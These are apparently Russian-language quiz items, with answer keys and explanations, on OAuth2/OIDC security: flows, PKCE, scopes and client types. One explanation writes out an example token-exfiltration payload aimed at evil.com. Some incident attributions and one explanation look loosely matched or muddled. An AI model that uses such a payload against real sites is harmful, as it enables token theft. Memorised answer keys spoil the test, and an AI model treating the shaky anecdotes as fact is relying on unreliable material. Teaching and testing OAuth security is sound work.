...
> [!mcq]
> - [ ] OAuth2 — протокол аутентификации (RFC 6749), отвечающий на вопрос «кто пользователь?» и заменяющий собой login/password. | OAuth2 — протокол авторизации (AuthZ), не аутентификации (AuthN). За «кто пользователь» отвечает OIDC поверх OAuth2 через ID Token. ❌ ПОСЛЕДСТВИЕ: команда строит «Login with Google» только на access token без ID Token и nonce → принимает чужой токен от другого приложения (token substitution), компрометация аккаунтов — типичный паттерн уязвимостей в early Google OAuth integrations 2014.
> - [ ] OAuth2 — протокол авторизации (RFC 6749), при котором клиент получает пароль пользователя в зашифрованном виде для дальнейших API-запросов. | Главный принцип OAuth2 — клиент никогда не видит пароль. Передача пароля — это удалённый ROPC grant. ❌ ПОСЛЕДСТВИЕ: при компрометации клиента утекает пароль пользователя ко всем сервисам, где он переиспользован (LinkedIn 2012 leak — 117M паролей через credential reuse).
> - [ ] OAuth2 — протокол авторизации с бессрочными токенами; токен живёт пока пользователь не нажмёт «отозвать» в настройках провайдера. | По RFC 6749 access token имеет `expires_in` (обычно 15–60 мин). Бессрочные токены ломают principle of least privilege. ❌ ПОСЛЕДСТВИЕ: украденный долгоживущий токен (XSS, лог) даёт permanent access — нарушение GDPR Art. 32 (timely access revocation) и штраф до 2% оборота.
> - [x] OAuth2 (RFC 6749) — протокол делегированной авторизации: клиент получает короткоживущий токен с ограниченным scope вместо логина/пароля пользователя; AuthN (кто ты?) делегируется на Authorization Server, OIDC добавляется сверху для идентификации. | Верное определение. Разделение AuthN/AuthZ — ядро современной identity-архитектуры. ✓ ПРИМЕНЯТЬ: GitHub OAuth Apps, Google Sign-In, Azure AD — миллионы интеграций через Authorization Code Flow + scope-based permissions. 📋 ПРАВИЛО: «Токен вместо пароля, scope вместо all-access». 🔗 См. Q2, Q3, Q20.
...
> [!mcq]
> - [ ] Три роли: Authorization Server, Resource Server, Client; пользователь — часть роли Client. | RFC 6749 определяет четыре роли. Resource Owner (пользователь) — самостоятельная роль, не часть Client. ❌ ПОСЛЕДСТВИЕ: разработчик пишет endpoint `/api/users/{id}` без проверки `sub` из токена → IDOR-уязвимость, любой клиент с токеном читает чужие данные (Equifax-подобные leaks через broken object-level authorization).
> - [ ] Четыре роли: Resource Owner, Client, Authorization Server, Resource Server; AS и RS — это всегда один компонент. | AS и RS могут быть как совмещены (монолит), так и разделены (микросервисы). ❌ ПОСЛЕДСТВИЕ: команда совмещает AS и RS «по умолчанию» в каждом сервисе → 5 микросервисов = 5 разных JWKS и issuer → каждое разделение domains = ручная sync ключей, broken token validation после ротации.
> - [ ] Четыре роли: Resource Owner, Client, Authorization Server, Resource Server; Client всегда confidential и обязан хранить client_secret. | Существует два типа: confidential (backend, есть client_secret) и public (SPA/mobile, нет секрета — используют PKCE). ❌ ПОСЛЕДСТВИЕ: разработчик зашивает client_secret в JS-bundle SPA → secret извлекается через DevTools, злоумышленник создаёт свой клиент от имени приложения (typical mistake до OAuth 2.1 PKCE-mandate).
> - [x] Четыре роли по RFC 6749: Resource Owner (владелец данных), Client (приложение), Authorization Server (выдаёт токены), Resource Server (хранит ресурсы и проверяет токены); AS и RS могут быть одним сервером или разными. | Верные 4 роли. AS отвечает за authentication пользователя и выдачу токенов, RS — за валидацию токена и доступ к данным. ✓ ПРИМЕНЯТЬ: Keycloak (AS) + множество Spring Boot микросервисов (RS), общий JWKS — типичная enterprise-схема. 📋 ПРАВИЛО: «Owner владеет, Client просит, AS выдаёт, RS хранит». 🔗 См. Q1, Q4, Q25.
...
> [!mcq]
> - [ ] AuthN отвечает на «что разрешено?» и выдаёт Access Token; AuthZ отвечает на «кто ты?» и выдаёт ID Token. | Вопросы и токены поменяны местами. AuthN — «кто ты?» (ID Token), AuthZ — «что разрешено?» (Access Token). ❌ ПОСЛЕДСТВИЕ: разработчик отправляет ID Token в `Authorization: Bearer` к Resource Server, RS принимает любой ID Token (audience совпадает с client_id, не с RS) → broken authentication, аккаунт-takeover в SaaS-приложениях с чужими ID Tokens.
> - [ ] AuthN и AuthZ в OAuth2 — синонимы: оба процесса выдают Access Token и определяют права доступа. | Это разные концепции: AuthN проверяет личность, AuthZ — права. ❌ ПОСЛЕДСТВИЕ: команда строит «Login with X» через `/oauth/authorize` без OIDC и nonce → принимает access token, выпущенный для другого client_id (token replay), захват аккаунтов жертв через социальную инженерию (Facebook OAuth bug 2018).
> - [ ] AuthN — основной фокус OAuth2; AuthZ — опциональное расширение через OIDC для проверки ролей. | Наоборот: OAuth2 — это AuthZ; OIDC добавляет AuthN сверху. ❌ ПОСЛЕДСТВИЕ: разработчик считает, что наличие access token уже подтверждает личность пользователя → пропускает проверку ID Token и nonce → confused-deputy, токен другого пользователя сходит за свой.
> - [x] Аутентификация (AuthN) — «кто ты?» (ID Token в OIDC); авторизация (AuthZ) — «что тебе разрешено?» (Access Token в OAuth2); OAuth2 сам по себе AuthZ, OIDC добавляет AuthN сверху через ID Token. | Верное разграничение. Access Token — пропуск к ресурсам (для RS), ID Token — удостоверение личности (для клиента). ✓ ПРИМЕНЯТЬ: Auth0/Okta/Azure AD при `scope=openid` возвращают ID Token + Access Token — клиент использует ID Token для UI «Hello, {name}», Access Token для API-запросов. 📋 ПРАВИЛО: «ID Token идентифицирует, Access Token авторизует». 🔗 См. Q1, Q12, Q20.
...
> [!mcq]
> - [ ] Три типа: confidential (backend), public (SPA/mobile), hybrid (обфусцированный код частично хранит секрет). | RFC 6749 знает только два типа: confidential и public. Hybrid в стандарте нет. ❌ ПОСЛЕДСTВИЕ: команда верит в «hybrid» и кладёт client_secret в obfuscated JS bundle → за 2 часа security-исследователь извлекает секрет через source maps, регистрирует приложения от имени продукта.
> - [x] Два типа: confidential (backend, может безопасно хранить client_secret) и public (SPA/mobile/desktop, не могут хранить секрет — обязаны использовать Authorization Code Flow + PKCE). | Верная классификация по способности хранить секрет. PKCE защищает конкретный code exchange у public clients. ✓ ПРИМЕНЯТЬ: Spring Boot backend — confidential client с `client-secret` в Vault; React SPA — public client с PKCE через `oidc-client-ts` или Spring Security `oauth2Login` + `code_challenge_method=S256`. 📋 ПРАВИЛО: «Хранишь секрет — confidential, не хранишь — public + PKCE». 🔗 См. Q2, Q7, Q10.
> - [ ] Два типа: confidential (SPA с обфусцированным кодом) и public (backend без секретов). | Типы перепутаны: SPA — public, backend — confidential. ❌ ПОСЛЕДСТВИЕ: разработчик регистрирует SPA как «confidential» в Keycloak с client_secret → secret в Network tab DevTools → создание fake-клиента, фишинг через клон auth-страницы.
> - [ ] Два типа: confidential (backend) и public (SPA, mobile); public-клиенты обязаны использовать Implicit Flow, так как не могут хранить client_secret. | Implicit Flow удалён в OAuth 2.1 (deprecated). Public-клиенты используют Authorization Code Flow + PKCE. ❌ ПОСЛЕДСТВИЕ: legacy SPA на Implicit Flow → access token в URL fragment → утечка через browser history, Referer header, расширения браузера (типичный bug в Angular OAuth до v9).
...
> [!mcq]
> - [ ] Scope определяет срок жизни access token: `scope=short` → 15 мин, `scope=long` → 30 дней, `scope=offline_access` → бессрочно. | Срок жизни задаётся `expires_in` на стороне AS, не через scope. Scope — это набор разрешений. ❌ ПОСЛЕДСТВИЕ: разработчик пишет `scope=long` ожидая долгой сессии → AS отклоняет неизвестный scope → SPA в проде падает в 401 после деплоя, P1-инцидент.
> - [ ] Scope идентифицирует клиента: `scope=my-app` указывает AS, какому клиенту выдать токен, заменяя client_id. | Идентификация клиента — это `client_id`, не scope. Scope — про разрешения. ❌ ПОСЛЕДСТВИЕ: команда мигрирует с самописной авторизации и пишет `scope=service-name`, AS возвращает invalid_scope → flow ломается в production, hot-fix через ночь.
> - [ ] Scope автоматически выдаёт максимально широкие права; если scope не указан — полный доступ ко всему API. | Без scope AS отклонит запрос или применит default scope для клиента. Максимальные права по умолчанию нарушают least privilege. ❌ ПОСЛЕДСТВИЕ: команда не указывает scope → AS выдаёт default `read write admin` → утечка токена через лог = админ-доступ ко всем ресурсам, превышение прав CTO.
> - [x] Scope — механизм ограничения доступа: клиент указывает, какие разрешения запрашивает (`read:repos`, `email`, `openid`); RS проверяет scope в токене перед выдачей доступа. | Верное определение. Scope реализует principle of least privilege. ✓ ПРИМЕНЯТЬ: GitHub OAuth scopes (`repo`, `read:user`, `gist`) — клиент запрашивает минимум, юзер видит explicit consent, на RS — `@PreAuthorize("hasAuthority('SCOPE_read:repos')")`. 📋 ПРАВИЛО: «Запрашивай узко, проверяй на каждом endpoint». 🔗 См. Q4, Q12, Q24.
...
> [!mcq]
> - [ ] AS возвращает access token напрямую в URL fragment (`#access_token=...`) после успешной аутентификации. | Это Implicit Flow (deprecated в OAuth 2.1). В Authorization Code Flow токен не проходит через браузер. ❌ ПОСЛЕДСТВИЕ: токен в fragment попадает в browser history, Referer headers, browser extensions → утечка access token через любой третий-party скрипт страницы (типичный паттерн утечек у Single Page Apps до OAuth 2.1).
> - [ ] Сначала выдаётся authorization code, который клиент хранит постоянно и шлёт RS вместо access token. | Authorization code — одноразовый, короткоживущий (10 мин), используется один раз для обмена на токен. ❌ ПОСЛЕДСТВИЕ: разработчик кеширует code в Redis на 1 час и переиспользует → AS отклоняет с `invalid_grant` (replay detection) → пользователи каждый запрос вынуждены логиниться заново.
> - [x] AS выдаёт короткоживущий одноразовый code; backend обменивает его на access token через POST /token с client_secret; токен никогда не идёт через браузер. | Верная схема. Разделение code → token защищает от перехвата: код в URL не даёт токен без client_secret. ✓ ПРИМЕНЯТЬ: Spring Security `oauth2Login()` — фильтры `OAuth2LoginAuthenticationFilter` + `OAuth2AuthorizationCodeGrantFilter` обменивают code в `DefaultAuthorizationCodeTokenResponseClient`, токен хранится server-side в `OAuth2AuthorizedClientRepository`. 📋 ПРАВИЛО: «Code через браузер, token через backend». 🔗 См. Q7, Q10, Q23.
> - [ ] AS выдаёт code, который SPA-frontend обменивает на access token через JS-запрос с client_secret из localStorage. | client_secret нельзя класть в браузер — XSS/DevTools его легко достанут. SPA должны использовать PKCE без client_secret. ❌ ПОСЛЕДСТВИЕ: команда хранит client_secret в `localStorage.setItem('secret',...)` → один XSS на любой странице (через npm-supply-chain типа event-stream 2018) → массовая регистрация malicious clients от имени продукта.
...
> [!mcq]
> - [ ] PKCE: code_challenge = `BASE64URL(MD5(code_verifier))`; AS проверяет это при обмене code на token. | RFC 7636 требует SHA-256 (метод S256) или plain (legacy). MD5 имеет коллизии и запрещён. ❌ ПОСЛЕДСТВИЕ: команда пишет свой PKCE-клиент с MD5 → AS отклоняет (`invalid_request`) → миграция на SHA-256 в проде после жалоб пользователей; либо хуже — самописный AS принимает MD5 → атакующий находит коллизию через offline brute-force.
> - [ ] PKCE: code_verifier шлётся в authorization request, code_challenge — при обмене на token. | Перепутано: challenge идёт в authorize, verifier — в token. ❌ ПОСЛЕДСТВИЕ: разработчик пишет mobile-клиент с обратной логикой → секретный verifier виден в URL и в логах AS access log → перехват code = перехват токена, защита от authorization code interception полностью теряется.
> - [ ] PKCE обязателен только для public clients (SPA, mobile); confidential clients с client_secret PKCE не нужен. | OAuth 2.1 делает PKCE обязательным для всех клиентов. PKCE и client_secret защищают разное: secret — клиента, PKCE — конкретный code exchange. ❌ ПОСЛЕДСТВИЕ: backend-клиент без PKCE → если authorization endpoint работает по HTTP-прокси с логированием (corp environment), code попадает в logs → reuse в течение TTL до того, как legitimate backend получит токен.
> - [x] PKCE: клиент генерирует случайный code_verifier (43–128 символов), вычисляет `code_challenge = BASE64URL(SHA256(code_verifier))`, шлёт challenge+method=S256 в /authorize, verifier — только в /token; AS сверяет `SHA256(verifier) == challenge`. | Верный механизм RFC 7636. Перехват code не даёт токена: атакующий не знает verifier (он не передавался по сети до момента обмена). ✓ ПРИМЕНЯТЬ: Spring Security 5.7+ автоматически добавляет PKCE для public clients (`ClientAuthenticationMethod.NONE`); Auth0/Okta/Google поддерживают S256 из коробки. 📋 ПРАВИЛО: «Challenge в URL, verifier в body». 🔗 См. Q6, Q31, Q37.
...
> [!mcq]
> - [ ] Client Credentials Flow аутентифицирует пользователя через логин/пароль напрямую у клиента (через Resource Owner Password Credentials). | Это ROPC, удалён в OAuth 2.1. Client Credentials — для M2M без участия пользователя, клиент аутентифицируется client_id+client_secret. ❌ ПОСЛЕДСТВИЕ: команда подменяет user через client_credentials → разработчик передаёт user_id в кастомном claim → wrong grant, у токена нет реального user-контекста, audit logs показывают «service-account» при действиях разных пользователей (compliance violation в банках, PCI DSS 8.1).
> - [ ] Client Credentials всегда возвращает access token + refresh token для долгоживущих сервисных сессий. | Refresh token не выдаётся — нет user-контекста для управления сессией. ❌ ПОСЛЕДСТВИЕ: разработчик пытается сохранить refresh_token из ответа `null` → NullPointerException в проде; либо самописный AS выдаёт refresh token для service account → утечка из k8s secret = perpetual access без принудительного re-auth.
> - [ ] Client Credentials может использоваться public clients (SPA) — flow не требует user-контекста. | Только confidential clients — нужен client_secret, SPA не может хранить секрет. ❌ ПОСЛЕДСТВИЕ: SPA запрашивает токен через client_credentials с зашитым secret → за 10 минут secret обнаруживается в minified bundle через `grep client_secret` → attacker получает service-level доступ ко всем backend-ресурсам.
> - [x] Client Credentials Flow — для M2M-сценариев: сервис аутентифицируется `client_id`+`client_secret` на /token с `grant_type=client_credentials`, получает access token (без refresh token); только для confidential clients. | Верный flow для межсервисного взаимодействия от своего имени. ✓ ПРИМЕНЯТЬ: Spring Boot `WebClient` + `OAuth2AuthorizedClientManager` с `client_credentials` registration; AWS IAM role-to-role через STS аналогично; Kubernetes ServiceAccount + Workload Identity на GCP. 📋 ПРАВИЛО: «M2M = client_id+secret, без user, без refresh». 🔗 См. Q4, Q12, Q25.
...
> [!mcq]
> - [ ] Device Flow: устройство встраивает мини-браузер и проводит юзера через обычный Authorization Code Flow с логином прямо на устройстве. | Смысл Device Flow — НЕ открывать браузер на устройстве. Smart TV/IoT/CLI не могут удобно показать логин-форму. ❌ ПОСЛЕДСТВИЕ: команда встраивает WebView в Smart TV-приложение → ввод пароля джойстиком занимает 5 минут → 70% пользователей бросают setup, customer-support tickets растут в 3 раза.
> - [ ] Device Flow для мобильных: device генерирует PKCE code_challenge и сразу обменивает на токен без polling. | Mobile использует обычный Authorization Code + PKCE (не Device Flow). Device Flow — для устройств БЕЗ удобного ввода: TV, консоли, принтеры. ❌ ПОСЛЕДСТВИЕ: разработчик iOS-приложения выбирает Device Flow → каждый логин требует второго устройства (iPhone-юзер логинится на iPhone через iPhone) → UX-провал, App Store rejection «poor user experience».
> - [ ] Device Flow для M2M: сервис генерирует device_code при старте и использует его как client_secret. | Это Client Credentials, не Device Flow. Device Flow всегда вовлекает пользователя через user_code. ❌ ПОСЛЕДСТВИЕ: разработчик pipeline-сервиса выбирает Device Flow → ServiceAccount работает только при наличии человека, который введёт user_code → cron-job каждый час требует человека-оператора, ночные деплои останавливаются.
> - [x] Device Authorization Flow (RFC 8628) — для устройств с ограниченным вводом (Smart TV, IoT, CLI): устройство получает device_code+user_code+verification_uri от AS, показывает user_code+URL пользователю, тот логинится на телефоне/ноутбуке; устройство polling-ом /token (`grant_type=urn:ietf:params:oauth:grant-type:device_code`) получает access token при готовности. | Верное описание. ✓ ПРИМЕНЯТЬ: Apple TV «Sign in on iPhone», Google «Enter code at google.com/device», AWS CLI `sso login` — все используют Device Flow для devices без удобной клавиатуры. 📋 ПРАВИЛО: «Код на TV, логин на телефоне». 🔗 См. Q4, Q11, Q40.
...
> [!mcq]
> - [ ] Authorization Code возвращает токен в URL fragment, Implicit обменивает code на токен через backend — это единственное отличие. | Перепутано: токен в fragment — это Implicit, обмен через backend — Authorization Code. ❌ ПОСЛЕДСТВИЕ: разработчик настраивает SPA на «обмен через backend» имея в виду Implicit → токены попадают в URL → утечка через Referer (Google Analytics, third-party widgets) — типичная утечка access tokens в Sentry до 2018.
> - [ ] Authorization Code — только для confidential clients, Implicit — только для public; оба актуальны в OAuth 2.1. | Authorization Code работает с обоими типами (public — через PKCE). Implicit удалён в OAuth 2.1. ❌ ПОСЛЕДСТВИЕ: команда оставляет Implicit Flow для SPA «по совместимости» → новый OWASP-аудит фиксирует deprecated flow → блок compliance, security-debt спринт минимум 2 недели.
> - [ ] Authorization Code использует state, Implicit использует PKCE; механизмы эквивалентны по уровню безопасности. | PKCE не применим к Implicit (нет code exchange). Даже с state Implicit небезопасен — токен в URL. ❌ ПОСЛЕДСТВИЕ: код-ревьюер «эквивалентность» воспринимает буквально → разрешает Implicit с state → bypass через `<img src="evil.com/steal?t=#access_token=...">` (token в fragment передаётся не на server, но через JS-обработчик evil-страницы доступен любому скрипту на ней).
> - [x] Authorization Code Flow выдаёт короткоживущий code → backend обменивает на access token через POST /token (токен не идёт через браузер); Implicit Flow возвращает access token прямо в URL fragment (#access_token=...) без обмена; Implicit удалён в OAuth 2.1 как небезопасный. | Верные различия. ✓ ПРИМЕНЯТЬ: миграция Auth0 SPA SDK с Implicit на Authorization Code + PKCE (auth0-spa-js v1.0+, 2019) — решила проблемы token leak через Referer и отсутствия refresh token. 📋 ПРАВИЛО: «Backend-обмен безопасен, fragment-токен мёртв». 🔗 См. Q6, Q7, Q11.
...
> [!mcq]
> - [ ] Token introspection (RFC 7662) — механизм, при котором Authorization Server проверяет токен у Resource Server через POST /introspect и получает подтверждение его валидности. | Направление перепутано: RS спрашивает AS о статусе токена, а не наоборот. AS — источник истины о токене, RS — потребитель этой информации. ❌ ПОСЛЕДСТВИЕ: типичная ошибка вызывает баг в production без покрытия тестами.
...
> [!mcq]
> - [x] Production-чеклист OAuth2 включает: HTTPS везде, PKCE для всех клиентов, exact match redirect_uri, короткий TTL access token (15–60 мин), refresh token rotation, httpOnly+Secure+SameSite cookie для токенов, валидацию iss/aud/exp JWT, маскирование токенов в логах, ротацию signing keys. | Полный production-чеклист. Все меры покрывают OWASP ASVS требования для OAuth2. Отсутствие любой из них — значимый security-риск в production. Это ключевое разграничение из best practice.
